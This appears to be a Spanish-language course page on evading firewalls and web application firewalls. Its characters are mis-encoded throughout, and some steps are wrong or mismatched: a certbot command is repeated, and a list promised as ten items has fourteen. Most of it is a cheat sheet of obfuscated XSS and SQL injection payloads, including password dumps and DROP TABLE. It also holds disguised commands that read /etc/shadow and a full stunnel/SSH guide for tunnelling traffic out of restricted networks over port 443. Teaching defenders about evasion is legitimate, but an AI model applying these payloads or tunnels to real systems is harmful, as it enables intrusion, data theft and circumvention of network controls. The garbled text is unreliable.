# T√©cnicas de evasi√≥n de firewall

## T√©cnicas empleadas por los cortafuegos

Los firewalls emplean al menos una de las siguientes t√©cnicas para realizar un seguimiento del tr√°fico de la red:

1. **Filtrado de paquetes** : la mayor√≠a de los firewalls son de este tipo. Peque√±os fragmentos de datos llamados paquetes son examinados por una serie de filtros cuando intentan ingresar a la red. Luego, seg√∫n el origen y el destino de las direcciones IP, protocolos y puertos, el firewall decide si se les permite ingresar o no.
2. **Firewall de aplicaci√≥n/puerta de enlace**: al filtrar el tr√°fico a nivel de aplicaci√≥n. Para evitar conexiones directas entre el dispositivo y los paquetes entrantes, los servidores proxy act√∫an como intermediarios.
3. **Firewall de pr√≥xima generaci√≥n** (NGFW): para defenderse contra ataques de red y basados ‚Äã‚Äãen la web, estos sofisticados firewalls integran tecnolog√≠as cl√°sicas de firewall de red con firewalls de aplicaciones web (WAF). Un NGFW tambi√©n incluye funciones adicionales que incluyen antivirus, inspecci√≥n de tr√°fico cifrado y sistemas de prevenci√≥n de intrusiones (IPS). La inspecci√≥n profunda de paquetes, que examina los datos en la carga √∫til del paquete en lugar de simplemente el encabezado del paquete, es una caracter√≠stica de un NGFW.
4. **Inspecci√≥n de estado**: esta es una t√©cnica m√°s reciente que examina el paquete en busca de rasgos distintivos particulares mientras compara componentes importantes del paquete con una base de datos. Se permite que el paquete pase si hay una coincidencia razonable.

> **"No permita que su firewall se convierta en un eslab√≥n d√©bil en su estrategia de ciberseguridad"**

# M√©todos de evasi√≥n

A pesar de que **los firewalls y los IDS** pueden impedir que paquetes maliciosos entren en una red, un atacante puede enviar paquetes modificados al objetivo para que pueda superar el IDS/Firewall. Estos son diez m√©todos de evasi√≥n:

1. **Cifrar datos**: al cifrar los datos que se transmiten, resulta m√°s dif√≠cil para el firewall o el sistema de detecci√≥n de intrusos detectar cualquier actividad maliciosa.
2. **VPN**: una red privada virtual (VPN) puede ayudar a eludir los firewalls y los sistemas de detecci√≥n de intrusiones al enrutar el tr√°fico a trav√©s de un servidor seguro.
3. **Servidor proxy**: un servidor proxy puede ayudar a enmascarar el origen del tr√°fico, lo que dificulta que el firewall o el sistema de detecci√≥n de intrusos rastreen el origen de un ataque.
4. **TOR**: La red TOR puede ayudar a ocultar la identidad del usuario y el origen del tr√°fico, lo que dificulta que el firewall o el sistema de detecci√≥n de intrusiones detecten cualquier actividad maliciosa.
5. **Salto de puerto**: al cambiar constantemente el puerto utilizado para transmitir datos, resulta m√°s dif√≠cil para el firewall o el sistema de detecci√≥n de intrusos detectar cualquier actividad maliciosa.
6. **Esteganograf√≠a**: al ocultar datos dentro de otro archivo o mensaje, resulta m√°s dif√≠cil para el firewall o el sistema de detecci√≥n de intrusos detectar cualquier actividad maliciosa.
7. **Protocolos de capa de aplicaci√≥n**: al utilizar protocolos de capa de aplicaci√≥n como HTTP o SMTP, resulta m√°s dif√≠cil para el firewall o el sistema de detecci√≥n de intrusos detectar cualquier actividad maliciosa.
8. **C√≥digo malicioso:** al utilizar c√≥digo malicioso o malware, resulta m√°s dif√≠cil para el firewall o el sistema de detecci√≥n de intrusiones detectar cualquier actividad maliciosa.
9. **Ingenier√≠a social**: al enga√±ar a los usuarios para que divulguen informaci√≥n confidencial o realicen determinadas acciones, resulta m√°s f√°cil para un atacante eludir el firewall o el sistema de detecci√≥n de intrusos.
10. **Acceso f√≠sico**: al acceder f√≠sicamente a la red o al sistema, un atacante puede eludir el firewall o el sistema de detecci√≥n de intrusos.
11. **Software obsoleto**: los cortafuegos dependen del software para funcionar correctamente y este software debe actualizarse peri√≥dicamente para mantenerse al d√≠a con las √∫ltimas amenazas. Si no actualiza su software de firewall, puede volverse vulnerable a ataques descubiertos desde la √∫ltima actualizaci√≥n.
12. **Contrase√±as d√©biles:** una contrase√±a segura y √∫nica es una de las formas m√°s importantes de proteger su firewall contra violaciones. Si utiliza una contrase√±a d√©bil o f√°cil de adivinar, los hackers pueden acceder f√°cilmente a su firewall y comprometer su sistema.
13. **Acceso remoto no seguro:** si permite el acceso remoto a su sistema, es esencial proteger este acceso con una contrase√±a segura y autenticaci√≥n de dos factores. Si no se toman estas medidas, los hackers pueden potencialmente obtener acceso a su firewall a trav√©s de acceso remoto.
14. **Reglas configuradas incorrectamente :** los firewalls se basan en reglas para determinar qu√© tr√°fico est√° permitido y qu√© est√° bloqueado. Si estas reglas no se configuran correctamente, es posible que se permita que tr√°fico no deseado atraviese el firewall y comprometa su sistema.

> Para proteger su firewall contra violaciones, es esencial actualizar peri√≥dicamente su software, usar contrase√±as seguras, protegerse contra infecciones de malware, proteger el acceso remoto y configurar correctamente las reglas de su firewall.

## C√≥mo evadir un WAF

### ¬øQu√© hacer para encontrar el proveedor de WAF y la direcci√≥n IP real?

Divulgaci√≥n de propiedad intelectual real

1. EJECUTE `shodan.io` o `censys.io`
2. Busque registros SPF y registros TXT.

Los registros SPF y TXT pueden tener una direcci√≥n IP de un punto de origen sin CloudFlare.

> 3. Tambi√©n puede consultar securitytrails.com en el campo Los datos hist√≥ricos pueden tener IP original en registros antiguos.

**C√≥mo probar que WAF est√© configurado correctamente:**

- Los WAF utilizan los puertos est√°ndar 80, 443, 8000, 8008, 8080 y 8088.
- Los WAF configuran sus propias cookies en las solicitudes.
- Los WAF se asocian con encabezados separados.
- Los WAF se exponen en el encabezado del servidor.
- Los WAF se exponen en el contenido de la respuesta.
- Los WAF responden con c√≥digos de respuesta √∫nicos ante solicitudes maliciosas.
- Env√≠e una solicitud GET est√°ndar desde un navegador, intercepte y registre encabezados de respuesta (cookies espec√≠ficas).
- Env√≠e una solicitud desde la l√≠nea de comando (por ejemplo, cURL) y luego verifique el contenido y los encabezados de la respuesta.
- Env√≠e solicitudes GET a puertos abiertos aleatorios y verifique pancartas que puedan exponer la identidad de los WAF.
- Pruebe algunas cargas √∫tiles de inyecci√≥n SQL como: ‚Äùo 1 = 1: para iniciar sesi√≥n en formularios u olvidar una contrase√±a.
- Pruebe con cargas √∫tiles XSS ruidosas como <script>confirm()</script> en algunos campos de entrada.
- Intente agregar ../../../etc/passwd a un par√°metro aleatorio en la direcci√≥n URL.
- Agregue algunas cargas √∫tiles como ' OR SLEEP(5) OR ' al final de las URL a cualquier par√°metro aleatorio.
- Env√≠e solicitudes GET con protocolos obsoletos como HTTP/0.9 (HTTP/0.9 no admite consultas de tipo POST).
- Consulte el encabezado del servidor sobre diferentes tipos de interacciones.
- Env√≠e un paquete FIN&RST sin procesar al servidor e identifique una respuesta.
- Ataques de canal lateral: examine el comportamiento temporal del contenido de la solicitud y la respuesta.

## Herramientas para verificar y omitir WAF

> w3af : marco de auditor√≠a y ataque de aplicaciones web

- **[wafw00f](https://github.com/EnableSecurity/wafw00f)** ‚Äî Identificar y tomar huellas dactilares del firewall de aplicaciones web

- **[BypassWAF](https://github.com/vincentcox/bypass-firewalls-by-DNS-history):** evita los firewalls abusando del historial de DNS. Esta herramienta buscar√° registros DNS A antiguos y comprobar√° si el servidor responde para ese dominio.

- **[CloudFail](https://github.com/m0rtem/CloudFail)** : es una herramienta de reconocimiento t√°ctico que intenta encontrar la direcci√≥n IP original detr√°s del WAF de Cloudflare.

## T√©cnicas para evitar WAF:

### 1. T√©cnica de alternancia de casos

Combine caracteres en may√∫sculas y min√∫sculas para crear cargas √∫tiles eficientes.

**Solicitud b√°sica:**

```bash
<script>confirm()</script>
```

**T√©cnica omitida:**

```bash
<ScrIpT>confirm()</sCRiPt>
```

**Solicitud b√°sica:**

> SELECT * FROM * WHERE OWNER = 'NAME_OF_DB'

**T√©cnica omitida:**

> sELeCt * fRoM * wHerE OWNER = 'NAME_OF_DB'

**Ejemplo en URL:**

> http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4

### 2. T√©cnica de codificaci√≥n de URL

Codifique cargas √∫tiles normales con % de codificaci√≥n/codificaci√≥n de URL. Puedes usar Burp Suite. Dispone de una herramienta codificadora/decodificadora.

**Bloqueado por WAF:**

```bash
<Svg/x=‚Äú>‚Äù/OnLoAD=confirm()//
```

**T√©cnica omitida:**

```bash
%3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F
```

**Bloqueado por WAF:**

```bash
UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)
```

**T√©cnica omitida:**

```bash
UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29
```

**Ejemplo en URL:**

> https://example.com/page.php?id=1%252f%252a*/UNION%252f%252a /SELECT

### 3. T√©cnica Unicode

Los caracteres ASCII en codificaci√≥n Unicode nos brindan excelentes variantes para evitar WAF. Codifique toda o parte de la carga √∫til para obtener resultados.

**Solicitud b√°sica:**

```bash
<marquee onstart=prompt()>
```

**Ofuscado:**

```bash
<marquee onstart=\u0070r\u06f\u006dpt()>
```

**Bloqueado por WAF:**

```bash
/?redir=http://google.com
```

**T√©cnica omitida:**

```bash
/?redir=http://google„ÄÇcom (Unicode alternative)
```

**Bloqueado por WAF:**

```bash
<marquee loop=1 onfinish=alert()>x
```

**T√©cnica omitida:**

```bash
Ôºúmarquee loopÔºù1 onfinishÔºùalertÔ∏µ1)>x (Unicode alternative).
```

**Solicitud b√°sica:**

> ../../etc/shadow

**Ofuscado:**

```bash
%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow
```

### 4. T√©cnica de representaci√≥n HTML

Las aplicaciones web codifican caracteres especiales en HTML. Codificarlos y renderizarlos en consecuencia. Casos de bypass b√°sicos con codificaci√≥n HTML num√©rica y gen√©rica.

**Solicitud b√°sica:**

```bash
<img src=x onerror=confirm()>
```

**Carga √∫til codificada:**

```bash
&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;
```

**Carga √∫til codificada:**

> &#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;

### 5. T√©cnica de codificaci√≥n mixta

Estas reglas suelen tender a filtrar un tipo espec√≠fico de codificaci√≥n. Estos filtros pueden evitarse mediante cargas √∫tiles de codificaci√≥n mixta. Nuevas l√≠neas y tabulaciones y se agregan m√°s a la ofuscaci√≥n.

**Ofuscar carga √∫til:**

```bash
<A HREF="h

tt p://6 6.000146.0x7.147/">XSS</A>
```

### 6. Uso de la t√©cnica de comentarios

Los comentarios ofuscan los vectores de carga √∫til est√°ndar. Diferentes cargas √∫tiles tienen diferentes formas de ofuscarse.

**Bloqueado por WAF:**

```bash
<script>confirm()</script>
```

**T√©cnica omitida:**

```bash
<!--><script>confirm/**/()/**/</script>
```

**Bloqueado por WAF:**

```bash
/?id=1+union+select+1,2--
```

**T√©cnica omitida:**

```bash
/?id=1+un/**/ion+sel/**/ect+1,2--
```

Inserte comentarios en medio de las cadenas de ataque. Por ejemplo, /*!SELECT*/ puede ser pasado por alto por el WAF pero pasado a la aplicaci√≥n de destino y procesado por una base de datos mysql.

**Ejemplo en URL:**

> index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4
> 
> 
> 'union%a0select pass from users#

**Ejemplo en URL:**

> index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3

### 7. T√©cnica de doble codificaci√≥n

Los filtros de Web Application Firewall tienden a codificar caracteres para proteger la aplicaci√≥n web. Los filtros mal desarrollados (sin filtros de recursividad) se pueden omitir con doble codificaci√≥n.

**Solicitud b√°sica:**

> http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\

**Ofuscar carga √∫til:**

> http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\

**Solicitud b√°sica:**

```bash
<script>confirm()</script>
```

**Ofuscar carga √∫til:**

```bash
%253Cscript%253Econfirm()%253C%252Fscript%253E
```

### 8. T√©cnica de ofuscaci√≥n con comodines

Varias utilidades de l√≠nea de comandos utilizan patrones globales para trabajar con varios archivos. Podemos cambiarlos para ejecutar comandos del sistema.

**Solicitud b√°sica:**

> /bin/cat /etc/passwd

**Ofuscar carga √∫til:**

> /???/??t /???/??ss??

**Caracteres usados:**

> / ? t s

**Solicitud b√°sica:**

> /bin/nc 127.0.0.1 443

**Ofuscar carga √∫til:**

> /???/n? 2130706433 443

**Caracteres usados:**

> / ? n [0-9]

### 9. T√©cnica de generaci√≥n de carga √∫til din√°mica

Los lenguajes de programaci√≥n tienen diferentes patrones y sintaxis para la concatenaci√≥n. Esto nos permite generar cargas √∫tiles que pueden eludir muchos filtros y reglas.

**Solicitud b√°sica:**

```bash
<script>confirm()</script>
```

**Ofuscar carga √∫til:**

```bash
<script>eval('con'+'fi'+'rm()')</script>
```

**Solicitud b√°sica:**

> /bin/cat /etc/shadow

**Ofuscar carga √∫til:**

> /bi'n'''/c''at' /e'tc'/sh''ad'ow

Bash permite la concatenaci√≥n de rutas para su ejecuci√≥n.

**Solicitud b√°sica:**

```bash
<iframe/onload='this["src"]="javascript:confirm()"';>
```

**Ofuscar carga √∫til**

```bash
<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:con"+"fir"+"m()"';>
```

### 10. T√©cnica de personajes basura

WAF filtra f√°cilmente las cargas √∫tiles simples. Agregar algunos caracteres basura ayuda a evitar la detecci√≥n (solo en casos espec√≠ficos). Esta t√©cnica a menudo ayuda a confundir los firewalls basados ‚Äã‚Äãen expresiones regulares.

**Solicitud b√°sica:**

```bash
<script>confirm()</script>
```

**Ofuscar carga √∫til:**

```bash
<script>+-+-1-+-+confirm()</script>
```

**Solicitud b√°sica:**

```bash
<BODY onload=confirm()>
```

**Ofuscar carga √∫til:**

```bash
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>
```

**Solicitud b√°sica:**

```bash
<a href=javascript;alert()>ClickMe
```

**T√©cnica omitida:**

```bash
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
```

### 11. T√©cnica de saltos de l√≠nea

Muchos WAF con filtrado basado en expresiones regulares bloquean eficazmente muchos intentos. La t√©cnica de saltos de l√≠nea (CR y LF) puede romper la expresi√≥n regular del firewall y omitir cosas.

**Solicitud b√°sica:**

```bash
<iframe src=javascript:confirm(hacker)">
```

**Ofuscar carga √∫til:**

```bash
<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)">
```

### 12. T√©cnica de variables no inicializadas

Los filtros basados ‚Äã‚Äãen expresiones regulares incorrectos se pueden evadir con variables bash no inicializadas. Dicho valor es igual a nulo y act√∫a como cadenas vac√≠as. Bash y Perl permiten este tipo de interpretaciones.

Ofuscaci√≥n de primer nivel: normal

**Solicitud b√°sica:**

> /bin/cat /etc/shadow

**Ofuscar carga √∫til:**

> /bin/cat$u /etc/shadow$u

Ofuscaci√≥n de segundo nivel: basada en la posici√≥n

**Solicitud b√°sica:**

> /bin/cat /etc/shadow

**Ofuscar carga √∫til:**

> $u/bin$u/cat$u $u/etc$u/shadow$u

Ofuscaci√≥n de tercer nivel: caracteres aleatorios

**Solicitud b√°sica:**

> /bin/cat /etc/passwd

**Ofuscar carga √∫til:**

> $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff

### 13. T√©cnica de tabulaciones y avances de l√≠nea

Las pesta√±as a menudo ayudan a evadir los firewalls, especialmente los basados ‚Äã‚Äãen expresiones regulares. Las pesta√±as pueden ayudar a romper la expresi√≥n regular WAF cuando la expresi√≥n regular espera espacios en blanco y no pesta√±as.

**Solicitud b√°sica:**

```bash
<IMG SRC="javascript:confirm();">
```

**T√©cnica omitida:**

```bash
<IMG SRC=" javascript:confirm();">
```

**Variante:**

```bash
<IMG SRC=" jav ascri pt:confirm ();">
```

**Solicitud b√°sica:**

> http://test.com/test?id=1 union select 1,2,3

**T√©cnica omitida** :

> http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3

**Solicitud b√°sica:**

```bash
<iframe src=javascript:confirm()></iframe>
```

**Ofuscar carga √∫til:**

```bash
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:c&Tab;o&Tab;n&Tab;f&Tab;i&Tab;r&Tab;m&Tab;%28&Tab;%29></iframe>
```

### 14. T√©cnica para romper fichas

Los ataques a tokens intentan romper la l√≥gica de dividir una solicitud en tokens con disyuntores de tokens. Los token-breakers son s√≠mbolos que permiten afectar la correspondencia entre un elemento de una cadena y un determinado token. Nuestra solicitud debe seguir siendo v√°lida mientras utilizamos rompedores de tokens.

Estudio de caso: token desconocido para el "tokenizador"

**Nuestra carga √∫til:**

```bash
?id=‚Äò-sqlite_version() UNION SELECT passwords FROM users --
```

Estudio de caso: contexto desconocido para el analizador (observe el corchete sin contexto)

**Primera carga √∫til:**

```bash
?id=12);DROP TABLE users --
```

**Segunda carga √∫til:**

```bash
?id=133) INTO OUTFILE ‚Äòxxx‚Äô --
```

### 15. T√©cnica de ofuscaci√≥n en otros formatos.

Muchas aplicaciones web admiten diferentes tipos de codificaci√≥n y pueden interpretar la codificaci√≥n. Siempre necesitamos ofuscar la carga √∫til a un formato que no sea compatible con WAF, pero el servidor puede pasar de contrabando nuestra carga √∫til.

Caso IIS:

IIS 6, 7.5, 8 y 10 permiten interpretaciones de caracteres IBM037. Env√≠e los par√°metros codificados con la consulta.

**Solicitud original:**

```bash
POST /example.aspx?id7=sometext HTTP/1.1

HOST: target.org

Content-Type: application/x-www-form-urlencoded; charset=utf-8

Content-Length: 27

id2='union all select * from users--
```

**Solicitud ofuscada con codificaci√≥n de URL:**

```bash
POST /example.aspx?%89%84%F7=%A2%95%94%86%A3%88%89%95%87 HTTP/1.1

HOST: target.org

Content-Type: application/x-www-form-urlencoded; charset=ibm037

Content-Length: 127

%89%84%F2=%7D%A4%95%89%97%95%40%81%93%94%40%A2%85%93%85%84%A3%40%5C%40%86%99%97%94%40%A4%A2%85%99%A2%60%60
```

## NMAP - Script firewall-bypass

Detecta una vulnerabilidad en netfilter y otros firewalls que utilizan ayudas para abrir din√°micamente puertos para protocolos como ftp y sip. El script funciona falsificando un paquete del servidor de destino solicitando abrir una conexi√≥n relacionada a un puerto de destino que ser√° cumplida por el firewall a trav√©s del puerto auxiliar de protocolo adecuado. Para que esto funcione, la m√°quina atacante debe estar en el mismo segmento de red que el firewall. El script admite el asistente ftp tanto en IPv4 como en IPv6. El filtro de ruta real se utiliza para prevenir este tipo de ataques.

Descarga: **[https://svn.nmap.org/nmap/scripts/firewall-bypass.nse](https://svn.nmap.org/nmap/scripts/firewall-bypass.nse)**

Para m√°s informaci√≥n, ver:

- **[http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/](http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/)**

**Argumentos**

- firewall-bypass.helper

- El ayudante a utilizar. El valor predeterminado es ftp. Ayudantes compatibles: ftp (tanto IPv4 como IPv6).

**firewall-bypass.targetport**

Puerto para probar la vulnerabilidad. El puerto de destino debe ser un puerto no abierto. Si no se proporciona, el script intentar√° encontrar un puerto filtrado o cerrado a partir de los resultados del escaneo de puertos.

**firewall-bypass.helperport**

> Si no utiliza el puerto predeterminado del asistente.


**Ejemplos**

```bash
nmap --script firewall-bypass <target>

nmap --script firewall-bypass --script-args firewall-bypass.helper=‚Äúftp‚Äù, firewall-bypass.targetport=22 <target> 
```

**Salida**

```bash
Host script results:

| Firewall omission:

|_ Firewall vulnerable to omission via ftp wizard (IPv4)
```

**C√≥mo evitar los firewalls ocultando todo el tr√°fico en el tr√°fico encapsulado HTTPS(SSL)443**

Por lo general, cuando se est√° detr√°s de un firewall p√∫blico o bloqueado, la mayor√≠a del tr√°fico de salida (saliente) permitido es el puerto 80(http) y 443(https). Esto es para permitir s√≥lo la navegaci√≥n web y evitar el uso de otras aplicaciones y servicios como el correo electr√≥nico o los juegos. El tr√°fico web saliente tambi√©n se puede restringir mediante el filtrado de contenido, permitiendo a qu√© tipo de sitios web se puede acceder. Otra gran preocupaci√≥n es la privacidad. Cuando utiliza redes p√∫blicas o incluso utiliza la red de su propio ISP, todo su tr√°fico es visible para ellos.

Con esta configuraci√≥n de proxy inverso podemos enmascarar todo nuestro tr√°fico para que aparezca esencialmente como tr√°fico HTTPS, lo que nos permite evitar muchas de estas restricciones. Esto tambi√©n se puede utilizar como alternativa a las VPN o junto con VPN para enmascarar a√∫n m√°s el tr√°fico y proporcionar m√°s privacidad. Este m√©todo funcionar√° en la mayor√≠a de las situaciones. A veces, se configura la inspecci√≥n SSL o se aprovecha el filtrado de contenido avanzado y/o la inteligencia sobre amenazas, lo que aumenta los factores de bloqueo del tr√°fico. Sin embargo, estos escenarios normalmente s√≥lo ocurren en entornos corporativos maduros y no en las redes p√∫blicas promedio.

Alojaremos un proxy inverso en Internet. Con una herramienta llamada stunnel podemos crear un t√∫nel de reenv√≠o de puertos cifrados a trav√©s de una conexi√≥n 443 (HTTPS). Luego usaremos ese reenv√≠o de puerto para crear un t√∫nel ssh oculto dentro del tr√°fico 443(ssl) cifrado que nos permitir√° configurar un proxy de sockets anidado O un reenv√≠o de puerto que a su vez nos permitir√° enviar cualquier tr√°fico que queramos fuera de la red.

![firewall-bypass](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/firewall-bypass.png?raw=true)

### **Requisitos**

Para esta implementaci√≥n usar√© un VPS (servidor privado virtual) Ubuntu 23.04 para el servidor proxy inverso y Kali 6.3.0 para la m√°quina cliente . Esta configuraci√≥n no requiere estos sistemas operativos espec√≠ficamente. Si decide utilizar diferentes sistemas operativos, aseg√∫rese de que las herramientas sean compatibles.

Servidor proxy inverso:

- [LetsEncrypt (servicio de certificado SSL gratuito)](https://letsencrypt.org/docs/faq/)
- Dominio comprado para crear un certificado SSL v√°lido (puede ser un dominio econ√≥mico, es decir, $1,99/a√±o)

Herramientas/Servicios

- [apache2](https://httpd.apache.org/)
- [certbot](https://certbot.eff.org/)
- [stunnel(server mode)](https://www.stunnel.org/)

M√°quina cliente:

Herramientas

- [stunnel (modo cliente)](https://www.stunnel.org/)

### **Configuraci√≥n**

Servidor Proxy inverso

El servidor requerir√° el mayor esfuerzo de configuraci√≥n. Como se trata de una nueva instalaci√≥n de Ubuntu, actualizaremos y actualizaremos el servidor.

> sudo apt update && sudo apt upgrade -y

Ahora necesitamos instalar el servicio apache2 y luego ejecutar certbot para recibir nuestro certificado SSL de LetsEncrypt. Esto nos permite recibir un certificado SSL firmado relacionado con nuestro dominio para el servidor proxy inverso.

**Instalar Apache2**

> sudo apt update
> 
> 
> sudo apt install apache2
> 

Teniendo en cuenta que el servidor ejecuta servicios y es accesible desde Internet, crearemos reglas de firewall basadas en host.

Crear reglas de firewall basadas en host

> sudo ufw allow 22/tcp
> 
> 
> sudo ufw allow 80/tcp
> 
> sudo ufw allow 443/tcp

No dude en agregar m√°s reglas de firewall que sean necesarias para cualquier otro servicio que decida ejecutar. Ahora que se crearon las reglas, debemos habilitarlas.

Habilitar reglas de firewall

> sudo ufw reload

Habilitar el servicio Apache2

> sudo systemctl start apache2

Ahora, como se explica en el sitio web de certbot, utilizaremos el servicio apache2 para solicitar nuestro certificado SSL firmado para el dominio comprado. Si a√∫n no posee uno, este es el momento de comprar un dominio antes de continuar. El dominio que adquirimos es importante porque aqu√≠ es hacia1 donde se ver√° todo nuestro tr√°fico tunelizado cuando pase a trav√©s de la red y el firewall. Elija un nombre de dominio gen√©rico o inocente con un dominio de nivel superior com√∫n como .com, .net, .io, etc. (Se sabe que los firewalls con inteligencia de amenazas bloquean dominios baratos o poco comunes como .xyz)

El registrador suele proporcionar servicios DNS que utilizar√° para el dominio que compr√≥. Una vez que haya creado un registro DNS A y apunte a su servidor proxy inverso, estar√° listo para recibir su certificado SSL utilizando certbot. Certbot es un script que automatiza la creaci√≥n de certificados SSL con LetsEncrypt. Para ver instrucciones espec√≠ficas, que pueden variar seg√∫n el sistema operativo de su servidor proxy inverso, [visite aqu√≠](https://certbot.eff.org/instructions)

**Instalar Certbot**

> sudo snap install --classic certbot
> 
> 
> sudo ln -s /snap/bin/certbot /usr/bin/certbot

Antes de ejecutar cerbot, editaremos el archivo de configuraci√≥n /etc/apache2/sites-available/000-default.conf para que el script cerbot pueda identificar nuestro servidor por el nombre de dominio adquirido.

Editar el archivo de configuraci√≥n de Apache2

> sudo vim /etc/apache2/sites-available/000-default.conf

Agregue la siguiente l√≠nea al archivo de configuraci√≥n.

> ServerName yourdomain.net

![yourdomain.net](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net.png?raw=true)

Ahora es el momento de recibir nuestro certificado SSL y comenzar la configuraci√≥n de Stunnel.

Ejecutar certbot

> sudo snap install --classic certbot

Una vez que esto se ejecute correctamente, deber√≠a ver el resultado de d√≥nde se encuentran su nuevo certificado SSL y clave privada.

> cert = /etc/letsencrypt/live/yourdomain.net/fullchain.pem
> 
> 
> key = /etc/letsencrypt/live/yourdomain.net/privkey.pem

Ya no necesitamos el servicio apache2 ahora que hemos usado certbot para obtener nuestro certificado SSL v√°lido. El servicio debe detenerse para que stunnel pueda utilizar m√°s tarde el puerto de escucha 443.

Detener el servicio Apache2

> sudo systemctl stop apache2

Ahora se puede configurar Stunnel. Inst√°lelo en el servidor proxy inverso.

Instalar Stunnel

> sudo apt update
> 
> 
> sudo apt install stunnel4

Cree/edite el archivo de configuraci√≥n de stunnel en el servidor para usar nuestro nuevo certificado SSL. Definiremos su puerto de escucha e instrucciones de reenv√≠o.

> sudo vim /etc/stunnel/stunnel.conf

Agregue las siguientes l√≠neas al archivo de configuraci√≥n

> pid = /var/run/stunnel.pid
> 
> 
> cert = /etc/letsencrypt/live/yourdomain.net/fullchain.pem
> 
> key = /etc/letsencrypt/live/yourdomain.net/privkey.pem
> 
> [ssh]
> 
> accept = 0.0.0.0:443
> 
> connect = localhost:22

![yourdomain.net1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net1.png?raw=true)

Edite el archivo de configuraci√≥n adicional de stunnel para habilitar el servicio

> sudo vim /etc/default/stunnel4

Agregue la siguiente l√≠nea al final del archivo de configuraci√≥n

> ENABLED=1

![yourdomain.net2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net2.png?raw=true)

Iniciar el servicio de t√∫nel

> sudo /etc/init.d/stunnel4 restart 

Para asegurarse de que el servicio stunnel se est√© ejecutando y escuchando en el puerto 443 especificado, ejecute el siguiente comando

> sudo netstat -ano | grep tcp

![yourdomain.net3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net3.png?raw=true)

Si ve que su servidor proxy inverso est√° escuchando en el puerto 443 despu√©s de iniciar el servicio stunnel, ¬°ya est√° todo listo! Ahora pasemos a la m√°quina cliente, configuremos el cliente stunnel y comencemos a omitirlo.

### M√°quina cliente

Actualice y actualice la nueva instalaci√≥n de Kali en la m√°quina cliente.

> sudo apt update && sudo apt upgrade -y

Ahora que nuestra m√°quina cliente est√° actualizada y lista para funcionar, necesitamos instalar stunnel.

**Instalar Stunnel**

> sudo apt install stunnel4

Cree un archivo de configuraci√≥n para el cliente stunnel. Esto se puede crear en cualquier lugar, pero yo crear√© el m√≠o en el directorio $HOME.

Crear archivo de configuraci√≥n

> vim $HOME/stunnel-client.conf

Agregue las siguientes l√≠neas al archivo de configuraci√≥n

> pid = /tmp/stunnel.pid
> 
> 
> client=yes
> 
> [ssh]
> 
> accept=9443
> 
> connect=yourdomain.net:443

![Maquina Cliente1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente1.png?raw=true)

Ejecute el cliente stunnel para conectarse al servidor proxy inverso estableciendo el t√∫nel ssl(443)

> sudo stunnel $HOME/stunnel-client.conf

Ahora confirme si el cliente est√° escuchando en su puerto de reenv√≠o definido en el archivo de configuraci√≥n.

> sudo netstat -ano | grep tcp

![Maquina Cliente2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente2.png?raw=true)

**Evitando**

El servidor proxy inverso est√° completamente instalado y configurado. Podemos conectarnos exitosamente desde nuestra m√°quina cliente usando stunnel para crear el t√∫nel ssl(443). Ahora configuraremos nuestro puerto SSH forward o proxy de sockets¬† que estar√° oculto dentro de nuestro t√∫nel ssl(443).

sockets SSH 4/5 Proxy

Este t√∫nel SSH abrir√° un proxy de sockets¬† en la m√°quina cliente que reenviar√° cualquier tr√°fico que se le env√≠e a trav√©s del t√∫nel ssh que est√° oculto dentro del t√∫nel ssl(443).

Crear el t√∫nel proxy ssh sock

> sudo ssh -D 9090 -q -C -N <user>@127.0.0.1 -p 9443
> 
> - D : specifies the listening port of the socks proxy on the client
> - q : runs quiet mode where no output is displayed locally
> - C : compress data in the tunnel to save bandwidth
> - N : non interactive ssh session just creats the tunnel no command prompt
> - p : defines the destination port to connect to (We are conencting to port forward provided by stunnel client)

![Maquina Cliente3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente3.png?raw=true)

Reenv√≠o de puerto SSH

Este t√∫nel SSH crear√° un puerto de escucha en la m√°quina cliente para reenviar el tr√°fico a trav√©s del t√∫nel ssh que est√° oculto dentro del t√∫nel ssl(443).

Crear el t√∫nel de reenv√≠o de puertos ssh

> sudo ssh -q -C -N -L 9090:<destination ip>:<destination port> <user>@127.0.0.1 -p 9443

> -L : specifies the listening port of the port forward on the client
> 
> - q : runs quiet mode where no output is displayed locally
> - C : compress data in the tunnel to save bandwidth
> - N : non interactive ssh session just creats the tunnel no command prompt
> - p : defines the destination port to connect to (We are conencting to port forward provided by stunnel client)

